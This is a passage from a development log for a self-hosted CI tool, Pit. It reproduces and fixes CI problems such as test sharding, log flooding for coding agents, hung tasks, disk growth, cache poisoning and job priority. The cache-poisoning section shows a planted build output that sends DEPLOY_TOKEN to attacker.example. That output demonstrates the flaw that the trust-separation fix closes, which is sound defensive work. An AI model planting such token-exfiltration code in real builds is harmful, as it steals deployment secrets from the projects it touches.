[bug0](https://bug0.com/blog/playwright-test-sharding-guide),
[remarkablemark](https://remarkablemark.org/blog/2022/05/13/jest-shard-test-github-actions/),
[Tim Deschryver](https://timdeschryver.dev/blog/using-playwright-test-shards-in-combination-with-a-job-matrix-to-improve-your-ci-speed),
[Lewis](https://lewis-38728.medium.com/speeding-up-playwright-tests-with-dynamic-sharding-in-github-actions-91906aa9ed8f),
[Abigail Armijo](https://abigailarmijo.substack.com/p/github-actions-part-3-shard-your)).
T3 Code's own CI shards its server tests six ways with a hand-written weighted sequencer
(`.github/workflows/ci.yml`, `test_server`).

**Reproduction** (`/tmp/painhunt/p14`): a suite of four 3 s test files behind a tiny runner that
understands `--shard=i/n`; two workers with two slots each.

**Before** (research/pain-hunt at P13): Pit had no way to split a task, so the suite ran as one
task on one worker while three slots sat idle.

```
passed in 12.6s · 1 ran, 0 cached
```

**Fix** (research/pain-hunt): `shards: N` on a task. The planner turns its group into `ci#1` …
`ci#N`, each with that task's shard plus its deps (setup repeats per shard and comes from the
cache after the first); the group's other tasks go in the first shard. Each shard gets
`PIT_SHARD` and `PIT_SHARD_COUNT`, and the shard is part of the cache key. Shard groups are
ordinary groups, so they spread across workers and each keeps its own warm worker (P11).

```
  default#1 on local    default#2 on w2    default#3 on w2    default#4 on local
    ✓ test 3.0s   ✓ test 3.0s   ✓ test 3.1s   ✓ test 3.1s
passed in 4.0s · 4 ran, 0 cached
-- each shard's log: "test file 1 ok" … "test file 4 ok"
```

12.6 s → 4.0 s. Covered by the unit test `sharded_tasks_split_into_groups_with_their_setup` and
the e2e test `sharded_tasks_run_each_shard_once`.

**Verdict: SOLVED** for splitting and spreading. Not done: choosing the shard count or balancing
shards by past durations (the runner's own `--shard` decides which tests go where), and merging
per-shard reports. No task may depend on a sharded task, so a "merge reports" step has to live
outside the pipeline for now. The CLI prints each shard's task as `test`; the group name
(`default#2`) is on the line above.

## P15. CI bills keep climbing

**Pain.** Teams move CI onto one box with a fixed monthly cost because the bill keeps growing,
and get faster builds from a warm cache as a side effect
([HN 49612772](https://news.ycombinator.com/item?id=49612772)). In December 2025 GitHub announced
a $0.002/minute platform charge for self-hosted runners from March 2026, then shelved it within
48 hours after backlash ("an unnecessary cash grab", [community#182089](https://github.com/orgs/community/discussions/182089));
as of October 2026 self-hosted minutes are still free but GitHub has not withdrawn the idea, and
hosted Linux 2-core minutes cost $0.006 ([devclass](https://www.devclass.com/development/2025/12/17/github-to-charge-for-self-hosted-runners-from-march-2026/1734518),
[samexpert](https://samexpert.com/github-actions-pricing-backlash-2026/),
[bex](https://bex.co/blog/2026/09/19/github-self-hosted-runner-charge-reversal),
[tenki](https://www.tenki.cloud/blog/github-actions-runner-pricing-2026),
[craci](https://craci.com/compare/github-actions-runner-providers),
[OpenMetal](https://openmetal.io/resources/blog/the-real-cost-math-behind-self-hosted-github-actions-runners/),
[StarSling](https://starsling.dev/github-actions-pricing),
[Platform Engineering](https://theplatformengineering.substack.com/p/github-actions-2026-pricing-changes)).
(An earlier search summary in this hunt said the fee was in effect; it is not.)

**Measured.** One T3 Code CI run on GitHub (run 38701079905, Blacksmith runners): 17 jobs,
1,416 runner-seconds, 34 billed runner-minutes (rounded up per job), 166 vCPU-minutes, of which
about 434 s (31%) is checkout and dependency install repeated in every job. On Pit, from this
hunt:

| What changed in the push | Machine time on Pit |
| --- | --- |
| Nothing a task reads (rerun, docs, other packages) | about 1 s, or none if the server answers from cache (P1, P10, P12) |
| Dependencies unchanged, code changed | the tasks' own run time; no checkout or install (P8, P11) |
| A newer push to the same branch | older runs stopped within a heartbeat (P9) |

**A bug in Pit's own numbers.** `/api/stats` computed "time saved" from the cache entries that
still exist, so eviction (P4) erased the history: after the 20 MB limit evicted the T3 Code
entries, the whole session reported 22 s saved. Fixed: hits and time saved are running counters
updated on every hit. Live check: three cached reruns gave `hits=4 timeSaved=6.1s`; after
evicting all 24 entries the counters still read `hits=4 timeSaved=6.1s`. Stats also report
`workerTimeMs` and `supersededRuns`. Covered by the unit test `time_saved_survives_eviction`.

**Verdict: PARTIAL.** Pit is self-hosted and outside Actions, so there is no per-minute charge,
and it removes the repeated setup (31% of T3 Code's runner time) plus all work whose inputs did
not change. But code changes still cost their real compute, Pit's machines are a fixed cost you
run and size yourself, and this hunt did not measure dollars against a real team's month of
pushes.

## P16. CI failure logs flood a coding agent's context and bury the error

**Pain.** Agents degrade as tool output piles into their context window (accuracy reported to
fall sharply past ~70% of capacity), and oversized tool payloads "bloat context windows with
irrelevant entries, increasing token consumption and distracting the model"; the suggested fix
is filtering and truncation, or keeping logs out of the main agent entirely
([Medium](https://medium.com/@tidianestano/why-ai-coding-agents-fail-tool-runtime-explained-fca55582d744),
[Medium](https://medium.com/@ai_transfer_lab/your-ai-coding-agent-is-going-to-fail-heres-why-and-what-actually-works-713efa1d2cff),
[DEV](https://dev.to/msinfotech/why-do-ai-agents-fail-on-long-coding-tasks-1n1f),
[DEV](https://dev.to/maximsaplin/ai-agent-failure-modes-beyond-hallucination-208g),
[Connsulting](https://www.connsulting.io/blog/concentric-feedback-loops),
[daily.dev](https://daily.dev/posts/ai-engineering-in-2026-agents-are-everywhere-but-humans-still-run-the-loops-t8knr6vxz),
[nhimg](https://nhimg.org/articles/coding-agent-observability-exposes-where-autonomous-code-fails/),
[TestSprite](https://www.testsprite.com/blog/why-your-ai-coding-agent-keeps-breaking-things-and-how-to-fix-it),
[IAN](https://iancloud.ai/blog/agentic-devops-production-verification-loop-2026)).

**Reproduction** (`/tmp/painhunt/p16`): two failing tasks driven through `pit mcp`'s `pit_run`,
the way a coding agent calls it. `typecheck` prints 20,000 lines of progress with the one real
error (`error TS2322`) at line 401; `lint` prints 3,000 lines and its error last.

**Before** (research/pain-hunt at P15): the response carried the last 80 lines of each failed
log.

```
response chars: 16760  ~tokens: 4190
contains the TS error: False
contains the lint error: True
```

The agent paid ~4,200 tokens for build noise and never saw the type error.

**Fix** (research/pain-hunt): `excerpt::excerpt` keeps lines that look like errors (`error`,
`fail`, `panic`, `exception`, `traceback`, `assert`, `fatal`, `✗`/`×`) with two lines of context,
plus the last eight lines, within 40 lines; shortens lines over 240 characters; marks omitted
stretches; and ignores "0 errors"-style summaries (but not "10 errors"). The MCP response ends
each task with a pointer to the full log (`pit_logs`); the CLI's failure output uses the same
excerpt.

```
response chars: 2597  ~tokens: 649
contains the TS error: True | contains the lint error: True

--- default.typecheck: exited with 2 ---
… 398 lines omitted …
src/billing/invoice.ts(42,7): error TS2322: Type 'string' is not assignable to type 'number'.
… 19591 lines omitted …
Found 1 error in 1 file.
(full log: 20002 lines; pit_logs with runId run_668b4fa5efa8 and task default.typecheck)
```

About 6× fewer tokens, and both errors present. Covered by the unit tests
`keeps_an_early_error_that_a_tail_would_miss` and `zero_error_summaries_are_not_errors`.

**Verdict: SOLVED** for logs whose errors say "error" or "fail". It is keyword matching: a
failure that prints none of those words falls back to the tail, and a log that prints "error"
on every line uses the 40-line budget on the first ones.

## P17. A toolchain upgrade reuses results built with the old toolchain

**Pain.** Caches keyed on lockfiles and sources but not on the toolchain restore artifacts built by
a different Node: native addons fail with "The module was compiled against a different Node.js
version" or crash V8. Ghost's CI shared caches across Node versions and got flaky native crashes
until it added the Node version to every cache key ([Ghost#23277](https://github.com/TryGhost/Ghost/pull/23277));
the same error is a staple of native-module issue trackers
([better-sqlite3#919](https://github.com/WiseLibs/better-sqlite3/issues/919),
[better-sqlite3#211](https://github.com/JoshuaWise/better-sqlite3/issues/211),
[node-canvas#1942](https://github.com/Automattic/node-canvas/issues/1942),
[electron/fiddle#1636](https://github.com/electron/fiddle/issues/1636),
[Azure OSS](https://azureossd.github.io/2023/05/31/Troubleshooting-a-Module-was-compiled-against-a-different-Node.js-version-errors/),
[SAP](https://userapps.support.sap.com/sap/support/knowledge/en/2956493),
[Edge Impulse](https://forum.edgeimpulse.com/t/error-the-module-was-compiled-against-a-different-nodejs-version/4766)),
and `setup-node` versions like `lts/*` move over time
([setup-node](https://github.com/marketplace/actions/setup-node-js-environment?version=v4.0.1)).

**Reproduction** (`/tmp/painhunt/p17`): a stand-in `toolver` command prints the toolchain version.
`build` writes "built with <version>" into `dist/` (cached output); `test` checks that the built
addon matches the current toolchain. Run, then "upgrade" the toolchain on the worker and run again.

**Before** (research/pain-hunt at P16): action keys cover the OS, arch, command, input files and
declared env values, not tool versions, so the upgrade reused the old build.

```
== toolchain upgraded to v24 on the worker, no code change
    ◆ build                    cached
    ✗ test                     21ms exit 1
    │ addon was compiled against a different toolchain:
    │ built with v22.11.0
    │ v24.3.0
```

A wrong cache hit, the worst kind of cache bug.

**Fix** (research/pain-hunt): `runtime: ["node --version"]` on a task (Nx calls these runtime
inputs). The worker runs each command once per job, in the workspace, and its output is part of
the action key; tasks without `runtime` keep their keys. Misses name the change. The server never
answers a task with `runtime` from cache (P12) because only the worker knows its toolchain.

```
== toolchain v22   ✓ build 82ms   ✓ test
== no change       ◆ build cached ✓ test
== upgraded to v24 ✓ build 14ms  ran because `/tmp/painhunt/p17/bin/toolver` changed (v22.11.0 → v24.3.0)
                   ✓ test
```

Covered by the unit test `runtime_outputs_are_part_of_the_key`.

**Verdict: SOLVED** when the task declares its toolchain. Pit does not guess: without `runtime`
(or the version in an `env` variable or a pinned version file listed in `inputs`), a toolchain
upgrade is still invisible to the key. `pit init` does not add `runtime` yet.

## P18. A hung task holds a runner for six hours

**Pain.** A test that waits on a database that never comes up, a prompt waiting for input, or a
deadlock prints nothing and never exits. GitHub Actions' `timeout-minutes` defaults to 360, so
the job sits for six hours, burning paid minutes and a runner, before failing
([SO4-Markets/so4-oracle#1037](https://github.com/SO4-Markets/so4-oracle/issues/1037),
[community#26679](https://github.com/orgs/community/discussions/26679),
[WarpBuild](https://www.warpbuild.com/answers/how-do-i-set-a-timeout-on-a-github-actions-job),
[compiler.dev](https://compiler.dev/guides/github-actions-time-limits),
[StarSling](https://starsling.dev/github-actions/problems/github-actions-timeouts),
[DevOpsBoys](https://devopsboys.com/blog/github-actions-job-timeout-fix-2026),
[suzukishunsuke](https://dev.to/suzukishunsuke/set-github-actions-timeout-minutes-1jkk),
[st-hakky](https://book.st-hakky.com/en/hakky/github-actions-timeout)). The usual advice is to
remember `timeout-minutes` on every job. CircleCI instead stops a step after 10 minutes without
output (`no_output_timeout`;
[config reference](https://circleci.com/docs/reference/configuration-reference/),
[support](https://support.circleci.com/hc/en-us/articles/360045268074-Build-Fails-with-Too-long-with-no-output-exceeded-10m0s-context-deadline-exceeded)),
and people ask GitHub for the same
([community#125394](https://github.com/orgs/community/discussions/125394)). The idle limit has
its own pain: quiet but healthy steps get killed and need it raised
([cypress-io/circleci-orb#430](https://github.com/cypress-io/circleci-orb/issues/430),
[aws-ecs-orb#115](https://github.com/CircleCI-Public/aws-ecs-orb/issues/115),
[YetAnotherCyclingSim#100](https://github.com/karnalooch/YetAnotherCyclingSim/pull/100)).

**Reproduction** (`/tmp/painhunt/p18/hang18`): `integration` runs
`echo connecting to test database...; sleep 100000`.

**Before** (research/pain-hunt at P17): tasks had no limit unless `timeout` was set. After 22s the
task was still running and holding the local worker's slot; it only ended when cancelled by hand.

**Fix** (research/pain-hunt): every task now has limits by default. `timeout` defaults to an hour,
and a new `idleTimeout` (default 15 minutes) stops a task that has printed nothing for that long,
counting from its last line, so a slow task that keeps printing is not touched. `0` turns either
off. The message names the limit that fired and how to change it. The whole process tree is
killed (and the container, for Docker), freeing the slot.

```
    ✗ integration              3.3s exit ?
    ✓ slow-but-alive           6.1s        (prints every 1s for 6s, idleTimeout: 3)
  ✗ default.integration: no output for 3s; stopped (set idleTimeout to change, 0 to disable)
    │ connecting to test database...
    │ [pit: no output for 3s; task stopped (idleTimeout)]
failed in 6.2s
```

Afterwards no `sleep 100000` process remained and the next run started at once. Covered by the
unit test `a_silent_task_is_stopped_by_the_idle_limit`.

**Verdict: SOLVED** for hung tasks: the default cap is 15 minutes of silence instead of six
hours. The CircleCI trade-off still applies: a task that is legitimately quiet for over 15
minutes (a long silent link or upload) must set `idleTimeout`, and Pit cannot tell a deadlock
from a task that is busy without printing.

## P19. Self-hosted runners fill their disks

**Pain.** Long-lived self-hosted runners keep every job's leftovers: work directories, tool
caches, Docker images. Eventually the disk is full and every job on that machine fails with
"No space left on device" until someone logs in and deletes things
([JetBrains IDEA-381717](https://youtrack.jetbrains.com/projects/IDEA/issues/IDEA-381717/GitHub-Actions-runner-fails-with-System.IO.IOException-No-space-left-on-device),
[community#133486](https://github.com/orgs/community/discussions/133486),
[DevOpsBoys](https://devopsboys.com/blog/runner-out-of-disk-space-fix-2026),
[WarpBuild](https://www.warpbuild.com/guides/github-actions-runner-out-of-disk)). Other systems
have the same problem: Buildkite users write their own cleanup hooks and ask for build
directories to be purged
([elastic-ci-stack-for-aws#1255](https://github.com/buildkite/elastic-ci-stack-for-aws/issues/1255),
[forum](https://forum.buildkite.community/t/disk-space-cleanup-on-agents-the-environment-hook-vs-docker-low-disk-gc/3325)),
an agent with a full disk keeps taking jobs and failing them
([buildkite/agent#1111](https://github.com/buildkite/agent/issues/1111)), IREE saw unbounded
growth from per-pipeline checkouts ([iree#7139](https://github.com/google/iree/issues/7139)),
and Azure Pipelines agents ask for work directory cleanup
([azure-pipelines-agent#1506](https://github.com/microsoft/azure-pipelines-agent/issues/1506)).

Pit makes this worse on purpose: warm workspaces keep `node_modules` and `target` between runs.

**Reproduction**: the worker on this machine, after a day of benchmarks and this hunt.

**Before** (research/pain-hunt at P18): nothing ever removed a workspace. The worker held
13.6 GB of workspaces, 8.8 GB of them dead: `t3code/0` (4.9 GB on `du`), `t3-7681688b/0` and
`/1` (2 GB each) were left by an older directory layout and would never be leased again, the
same thing a renamed group or a repo nobody builds leaves behind. A fake 300 MB workspace last
used 30 days ago was added to check age-based removal.

**Fix** (research/pain-hunt): every ten minutes the worker scans its workspaces (any directory
with a `.git` up to three levels down, so older layouts are found too). Idle workspaces unused
for 14 days are removed. Past `--workspace-max-gb` (default 50), the least recently used idle
ones go until the total fits. Busy workspaces are never touched. Last use is the mtime of a
marker written when a job releases the workspace, so it survives restarts. Under the pool lock
a chosen workspace is renamed into `.trash` and dropped from the pool, so no job can lease it
mid-delete; the slow delete happens after.

Restarted with `PIT_WORKSPACE_MAX_GB=5`:

```
removed workspace painhunt-p19/build/0 (0.3 GB, unused for 30 day(s))
removed workspace pitdemo/0 (0.0 GB, unused for 0 day(s))
removed workspace t3code/0 (5.4 GB, unused for 0 day(s))
removed workspace isodemo/0 (0.0 GB, unused for 0 day(s))
removed workspace t3-7681688b/0 (2.4 GB, unused for 0 day(s))
removed workspace t3-7681688b/1 (2.4 GB, unused for 0 day(s))
workspaces: 13.6 GB → 3.2 GB
```

(Sizes are allocated blocks in GB; `du -sh` reports GiB.) The live workspaces `rust/0` and
`web/0` survived: the next `pit run` of this repo had both ready in 1.5s, and clippy took 27s
incrementally. Deleting the 10 GB took about 25s, off the job path. Covered by the unit tests
`evicts_stale_then_least_recently_used_idle_workspaces` and `finds_workspaces_in_any_layout`.

**Verdict: PARTIAL.** Workspaces, the largest and fastest-growing part, are now bounded, and so
is the server cache (P4). Still unbounded on a worker: git mirrors (1.7 GB here, one per repo),
the worker's blob cache (89 MB), and Docker images and BuildKit cache, which Pit leaves to
`docker system prune`. The budget is checked every ten minutes, so a burst can overshoot it in
between, and a worker whose disk is full still claims jobs.

## P20. A branch poisons the cache (and the warm workspace) that main uses

**Pain.** If any build that runs can also write to the shared cache, a pull request can store
a crafted result under the key main will later compute, and main restores it. Adnan Khan's
[Cacheract](https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/)
([code](https://github.com/adnaneKhan/cacheract)) made this a turnkey attack on GitHub Actions
caches. It has been used against Angular, against Cline's releases
([Clinejection](https://adnanthekhan.com/posts/clinejection/),
[Snyk](https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/)), and
against npm packages with 36M weekly installs
([Lupin & Holmes](https://www.landh.tech/blog/20251003-36m-installs/)); see also
[Neciu Dan](https://neciudan.dev/github-actions-poisoning). CVE-2025-36852 ("CREEP") is the
same flaw in build caches: Nx, Turborepo and Bazel remote caches shared by PRs and main
([Cachely on Nx](https://cachely.dev/nx-remote-cache),
[Turborepo](https://cachely.dev/turborepo-remote-cache),
[Bazel](https://cachely.dev/bazel-remote-cache),
[dev.to](https://dev.to/rerodrigues/how-to-prevent-cache-poisoning-in-nx-and-lerna-monorepos-5f5g)).
The standard advice: only trusted CI writes what main reads. Persistent self-hosted runners have
the same problem with files: GitHub says they "can be persistently compromised by untrusted
code" ([GitHub docs](https://docs.github.com/en/actions/reference/security/secure-use),
[community#26722](https://github.com/orgs/community/discussions/26722),
[tenki](https://tenki.cloud/blog/self-hosted-runners-arc-security-guide),
[dev.to threat model](https://dev.to/kozhevniko/self-hosted-ci-runners-are-shared-secrets-threat-modelling-your-build-infrastructure-2ji3)).

Pit had both problems: one cache for every run, and warm workspaces shared by every run of a
repo and group, with ignored files kept between runs by design.

**Reproduction** (`/tmp/painhunt/p20`): `build` runs `sh scripts/build.sh` with
`inputs: ["src/**"]`. That is a common shortcut, and it means the script is not in the key.
Branch `evil` changes the script to write a token-stealing `dist/app.js` and to drop
`node_modules/.evil` into the workspace. The attacker runs `pit run` on the branch. Then a
harmless docs change goes through the merge queue. `check` prints `dist/app.js` and reports
whether the planted file exists.

**Before** (research/pain-hunt at P19), both trusted runs used the attacker's build. Main's
`scripts/build.sh` still copies `src/app.js`:

```
queue run      (2 tasks, 1 cached)  dist: fetch("https://attacker.example/?t=" + process.env.DEPLOY_TOKEN)
                                    workspace: POISONED (planted by branch evil)
post-merge run (2 tasks, 1 cached)  dist: fetch("https://attacker.example/?t=" + process.env.DEPLOY_TOKEN)
                                    workspace: POISONED (planted by branch evil)
```

**Fix** (research/pain-hunt): runs are trusted or untrusted.
- **Trusted:** pushes to the default branch (or `main`/`master`/`trunk`), merge queue runs and
  post-merge runs.
- **Untrusted:** PRs, other branches, every `pit run`, anything created through the API, and
  anything with uncommitted files.

The server decides this when it creates the run. When a worker reads or writes the cache, the
server works out trust from the job's lease, so neither a worker nor a client can claim it.
Untrusted runs read trusted results first and their own after that. Their writes go under a
separate key (`u:<key>`) that trusted runs never read. Untrusted runs also get their own warm
workspaces (`<group>~untrusted`). Cache entries from before this change could have come from
anywhere, so they are migrated to the untrusted side. When a trusted run skips an untrusted
result, it says so: "its only cached result came from an untrusted run (a PR, branch or
`pit run`), which trusted runs do not reuse".

**After**, in a fresh repo (`/tmp/painhunt/p20b`). The evil branch ran with `--no-cache`, so
its build really ran and planted the file in its own workspace. Then a docs change went
through the queue:

```
untrusted  pit run (evil)   dist: fetch("https://attacker.example/...")   workspace: POISONED
trusted    queue run        dist: export const answer = 42;               workspace: clean
trusted    post-merge run   dist: export const answer = 42;               workspace: clean
workspaces/app-5fe9e6/  default  default~untrusted
```

Repeat untrusted runs still hit their own cache, so P6's fast local loop keeps working. Covered
by the e2e test `untrusted_runs_cannot_poison_trusted_ones` and the unit test
`untrusted_results_are_never_served_to_trusted_runs`.

**Cost.** The first trusted run after a change rebuilds what a PR already built. That is the
same trade GitHub makes by scoping caches to branches.

**Hardened after an independent review** of the fix. The reviewer found no path from an
untrusted result to a trusted run in the normal case, but it found five gaps, all now fixed:
1. **A dead lease read untrusted results.** If a trusted run was cancelled or requeued while a
   task was running, the task's next cache read counted as untrusted and could see branch
   results. A lease that is no longer live now gets 409.
2. **Any API token holder could act as a worker.** Holding the token was enough to claim a
   trusted job and write trusted results with its lease. Claiming now needs `PIT_WORKER_TOKEN`
   when it is set, and `pit up` sets one for its built-in worker. A claim made with only the
   API token got 403 on the live server.
3. **The wrong branches were trusted.** `master` and `trunk` were trusted even when GitHub
   reported `main` as the default branch. Now only the known default branch is trusted, and
   queue runs use the mirror's default branch.
4. **Old workspaces became trusted.** Warm workspaces from before this change, which branch
   runs had shared, would have become the trusted pool. Both pools now have new names
   (`~trusted`, `~untrusted`), and the old directories age out (P19).
5. **The migration was not atomic.** It now runs in one transaction.

New tests: `trust_needs_a_worker_token_and_a_live_lease` (e2e) and
`only_the_default_branch_is_trusted` (unit).

**Verdict: PARTIAL.**
- **Closed:** cache entries and warm workspaces. These are the paths Cacheract and CREEP use.
- **Open: the host backend.** A task on `host` runs as the worker's user and can still write
  anywhere: other workspaces, `~/.cargo`, the mirrors. Untrusted code needs `sandbox` or
  `docker` for this to be a real boundary. Pit does not enforce that yet.
- **Open: the Turborepo and Bazel caches.** They are still one shared namespace, so tools that
  write through them need read-only tokens for PRs. Pit has no per-run tokens.
- **Open: the API token.** Anyone holding it can queue a change, and queue runs are trusted.
  That adds no new power, since queueing is how code reaches main. Without
  `PIT_WORKER_TOKEN` set, they can also claim jobs as a worker.
- **Open: unusual default branches.** For queue runs the default branch is guessed from the
  mirror (`main`, then `master`, then `trunk`), so a repo whose default is `develop` gets
  untrusted queue runs.

## P21. Monorepo CI reruns every package on every change

**Pain.** In a monorepo, a one-line change in one package still runs typecheck, tests and builds
for all of them. The usual fixes are Nx `affected`, Turborepo `--affected`/`--filter`,
hand-maintained path filters, or scripts that build a job matrix from changed packages
([WarpBuild](https://www.warpbuild.com/blog/github-actions-monorepo-guide),
[LeanIX on nx affected](https://engineering.leanix.net/blog/smarter-nx-affected-checks/),
[Tenki](https://www.tenki.cloud/blog/monorepo-ci-github-actions-selective-builds),
[Techplained](https://www.techplained.com/monorepo-ci-pipeline),
[dynamic-monorepo](https://github.com/Continuous-Actions/dynamic-monorepo)). Path filters do
not know the dependency graph, and hand-written lists drift from the repo.

The user also asked the direct question: is Pit faster than T3 Code's CI on Blacksmith?

**Reproduction**: T3 Code at `339179f50a` on this 8-core box, now idle (load average 0.35 before
the runs, against 11 to 15 during the first benchmark). The Blacksmith baseline from
`bench/README.md` is 190s at p50, on about 15 runners with about 100 vCPUs. The one-file edits
are uncommitted (`pit run`).

**Before** (research/pain-hunt at P20): Pit evaluates `pit.config.ts` on its own, without the
repo, so a config cannot list the workspace packages. The bench config has one `typecheck`
task over all 30 packages, and `test-web` and `build` take every package as input.

| Run (monolithic config) | Wall time | Notes |
| --- | --- | --- |
| Cold | 716s | `install` alone 162s. `test-web` failed: a 120s hook timed out under contention (500 of 501 files passed) |
| One-file edit in `apps/web` | **443s** | Workspace ready in 0.9s. `check` 51s, `typecheck` 137s, `knip` 301s, `build` 312s, `test-web` 441s, all on the same 8 cores |

**Fix** (research/pain-hunt): a config can export a function. Pit calls it with the repo's
workspace packages, read from `pnpm-workspace.yaml` or `workspaces` at the commit plus overlay.
Each package comes with `name`, `dir`, `scripts`, workspace `deps`, and `inputs`: globs for its
own directory and every workspace package it reaches. Results are memoized by config source plus
package list. [`bench/t3code.packages.pit.config.ts`](../bench/t3code.packages.pit.config.ts)
generates one typecheck per package (30 tasks, 36 in all) and gives `build` and `test-web` the
inputs of the packages they actually import.

| Run (per-package config) | Wall time | What reran |
| --- | --- | --- |
| One-file edit in `apps/web` | 438s | `typecheck` for `web` (6.4s) and `server` (36.4s) only, against 137s monolithic. `test-web` (433s) still sets the wall time, and it failed again on contention timeouts |
| One-file edit in `packages/ssh`, which `web` does not import | **209s** | 3 of 30 typechecks (`ssh`, `desktop`, `server`). **`test-web` cached.** `knip` 182s, `build` 204s |

The monolithic config reruns every task for the `ssh` edit as well, because `typecheck`,
`build` and `test-web` all take `packages/**`. That case was not timed separately; the `apps/web`
edit (443s) is the measured equivalent.

Two mistakes of mine on the way, kept here so the numbers can be trusted. First, the new config
failed T3 Code's own `vp check` (formatting) until I formatted it with `vp fmt`. Second, the
first `ssh` run went through a server still capped at the 0.02 GB cache from the P4 test, so
everything had been evicted and reran ("its earlier result was evicted…"). It was redone at
20 GB.

**Against Blacksmith (190s at p50):**
- **Pit wins:** anything cached (1.0s), setup (under 1s against about 30s per job), and edits
  that touch only part of the monorepo. On the `ssh` edit Pit was within 10% of Blacksmith on
  one box.
- **Pit loses:** an edit that reaches `test-web`, `build` and `knip`. There one 8-core VPS
  (443s) loses to 15 machines. The remaining time is compute, not orchestration.

**Verdict: PARTIAL.** Per-package affected runs now work and come from the repo itself; the
measured case dropped from 443s to 209s. Still to do:
- **Undeclared dependencies.** Inputs come from declared workspace dependencies, so a package
  that reads another without declaring it can get a wrong cache hit. Nx and Turborepo have the
  same limit.
- **Package managers.** Only JavaScript workspaces are read; Cargo and Go workspaces are not.
- **More cores.** Parity with Blacksmith on a full rerun needs more workers.

## P22. Merge queue jobs wait in line behind pull request jobs

**Pain.** Merge queue checks share runners with every PR's CI. On a busy day the queue's jobs
sit behind a wave of PR jobs, and every change waiting to land waits with them. GitHub offers no
job priority. It removed the old workaround of preferring repository-level runners: "the first
available matching runner at any level will run the job"
([community#25309](https://github.com/orgs/community/discussions/25309)). The remaining
advice is a separate runner pool just for merge-group jobs
([community#12835](https://github.com/orgs/community/discussions/12835),
[merge queue feedback](https://github.com/orgs/community/discussions/46757)). Related pain is
jobs stuck in "Waiting for a runner to pick up this job…"
([community#62365](https://github.com/orgs/community/discussions/62365),
[#31587](https://github.com/orgs/community/discussions/31587),
[actions/runner#3609](https://github.com/actions/runner/issues/3609),
[sengi](https://sengi.run/blog/github-actions-jobs-stuck)).

**Reproduction** (`/tmp/painhunt/p22`): a 2-slot worker, a task that takes 4s, six runs created
through the API, then a branch added to the merge queue half a second later. The measurement is
how long the queue run's group waited for a worker.

**Before** (research/pain-hunt at P21): groups were claimed strictly oldest first.

```
queue run waited 12.1s for a worker, then ran 4.5s
```

That is the full backlog: 6 × 4s over 2 slots.

**Fix** (research/pain-hunt): the claim order is now:
1. Merge queue groups.
2. Other trusted runs (main pushes, post-merge).
3. PRs, local and API runs.

Each tier is served oldest first. Affinity (P11) and backend matching still apply within that
order. Covered by the unit test `merge_queue_runs_are_claimed_before_older_runs`.

```
queue run waited 3.2s for a worker, then ran 4.4s
```

That is the time for one of the running tasks to finish. Pit does not preempt running work.

**Found on the way:** `pit … | head -1` panicked with "failed printing to stdout: Broken pipe",
because Rust ignores SIGPIPE by default. The CLI now restores the default on Unix and exits
quietly (status 141, like `ls | head`).

**Verdict: SOLVED** for ordering: queue work never waits behind PR work that has not started.
Not done:
- **No preemption.** A queue run still waits for a busy slot to free up, at most one task's
  duration.
- **Starvation.** A constant stream of queue and main runs can keep PR runs waiting. Nothing
  ages them up yet.

## P23. "Waiting for a runner to pick up this job…" without saying why

**Pain.** A job whose labels no online runner matches sits in "Queued" with no explanation. The
cause can be a typo in `runs-on`, an offline or busy self-hosted runner, a runner group that
does not allow the repo, or an unknown third-party label (one report had
`blacksmith-4vcpu-ubuntu-2204`). People debug it by comparing labels by hand
([community#62365](https://github.com/orgs/community/discussions/62365),
[#31587](https://github.com/orgs/community/discussions/31587),
[#199085](https://github.com/orgs/community/discussions/199085),
[actions/runner#3609](https://github.com/actions/runner/issues/3609),
[OpenHands#7362](https://github.com/OpenHands/OpenHands/issues/7362),
[sengi](https://sengi.run/blog/github-actions-jobs-stuck),
[devopsil](https://devopsil.com/articles/2026-03-30-github-actions-workflow-stuck-queued-fix)).
Self-hosted jobs are cancelled only after 24 hours in the queue
([GitHub docs](https://docs.github.com/en/enterprise-server@3.14/actions/reference/usage-limits-for-self-hosted-runners)).

**Reproduction** (`/tmp/painhunt/p23`): a config with three groups, `mac` (`os: ["macos"]`),
`img` (Docker) and `lin`, run on this machine's only worker (Linux; host, sandbox, docker).

**Before** (research/pain-hunt at P22): `img` and `lin` passed. `mac` stayed `queued` with no
message, and `pit run` waited silently until it was killed after 20s:

```
running [('img', 'passed', None), ('lin', 'passed', None), ('mac', 'queued', None)]
```

**Fix** (research/pain-hunt): every 2 seconds the server compares queued groups older than 3s
with the workers seen in the last 30s. A group that none of them can run (wrong OS, or a missing
`sandbox`/`docker` backend) gets a message naming what it needs and what is online. The message
is streamed as an event, shown by the CLI and the dashboard, and included in the MCP summary
for agents. It is cleared once a worker that fits comes online. The group keeps waiting,
because a worker may still join.

```
  mac (macos) waiting: no online worker can run it (needs os macos); online: local (linux; host, sandbox, docker). Start a matching `pit worker`.
```

That line appeared within a few seconds of the run starting. Covered by the unit test
`says_what_no_online_worker_provides`.

**Verdict: SOLVED** for explaining the wait. Not done:
- **No timeout.** A group nobody can run waits until the run is cancelled. GitHub cancels after
  24 hours; Pit never does.
- **Untested path.** Clearing the message when a matching worker comes online has no automated
  test.

## P24. Lint and typecheck caches never hit on ephemeral CI runners

**Pain.** ESLint `--cache`, `tsc --build`/`.tsbuildinfo` and knip `--cache` speed up repeat runs
locally, but each CI job starts from a fresh checkout. The cache files are gone unless an
`actions/cache` step saves and restores them, and even then they mostly miss. Git does not keep
modification times, so after a checkout every file looks changed. The workarounds are
`--cache-strategy content` for ESLint, actions that reset timestamps for `tsc`, and cache keys
tuned by hand
([eslint/eslint#16997](https://github.com/eslint/eslint/discussions/16997),
[tldraw#7633](https://github.com/tldraw/tldraw/issues/7633),
[renovate#16112](https://github.com/renovatebot/renovate/issues/16112),
[Attest/typescript-cache-action](https://github.com/Attest/typescript-cache-action),
[charpeni](https://charpeni.com/blog/speeding-up-eslint-even-on-ci),
[enochchau](https://enochchau.com/blog/2022/eslint-cache-ci/),
[branclon](https://branclon.com/blog/speeding-up-linting/)). Knip's CI guide just says to use
`--cache` ([knip.dev](https://knip.dev/guides/using-knip-in-ci)). There are reports of knip
taking 3–4 minutes in CI ([knip#1642](https://github.com/webpro-nl/knip/issues/1642)), and no
published numbers for what the cache saves.

**Reproduction 1, Pit's side** (`/tmp/painhunt/p24`): a task prints the modification times of
`src/a.txt` and `src/b.txt` and writes into an ignored `.toolcache/`. It runs once, then again
after a commit that changes only `b.txt`.

```
